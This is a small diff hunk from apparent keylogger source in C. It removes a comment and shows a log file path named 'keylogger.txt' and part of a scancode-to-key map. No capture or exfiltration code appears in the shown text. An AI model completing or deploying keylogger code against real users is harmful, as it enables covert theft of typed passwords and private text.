@@ -10,7 +10,6 @@
 
 #define LOGFILEPATH "./keylogger.txt"
 
-// Extended key map for common keys, numbers, and symbols
 char* keymap[] = {
     "", "[ESC]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BACKSPACE]",
     "[TAB]", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "[ENTER]",
